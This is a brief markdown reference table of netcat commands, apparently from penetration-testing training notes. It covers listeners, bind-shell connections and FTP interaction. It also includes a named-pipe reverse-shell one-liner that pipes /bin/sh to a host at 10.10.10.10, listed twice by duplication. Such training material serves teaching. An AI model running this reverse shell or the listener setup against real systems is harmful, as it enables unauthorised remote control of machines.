|**Command**|**Description**|
|-|-|
| **Interaction between nodes** |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.10.10 1234 >/tmp/f` | Another command to send a reverse shell from the remote server |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.10.10 1234 >/tmp/f` | Another command to send a reverse shell from the remote server |
| `nc 10.10.10.1 1234` | Connect to a bind shell started on the remote server |
| `nc -v 192.168.2.142 21` | Connecting to the FTP server using `netcat`. |
| `sudo nc -lvnp <port #>` | Starts a `netcat` listener on a specified port |
| `nc -nv <ip address of computer with listener started><port being listened on>` | Connects to a netcat listener at the specified IP address and port |
| **Interaction between services** |
| `nc -nv <FQDN/IP> 21` | Interact with the FTP service on the target. |
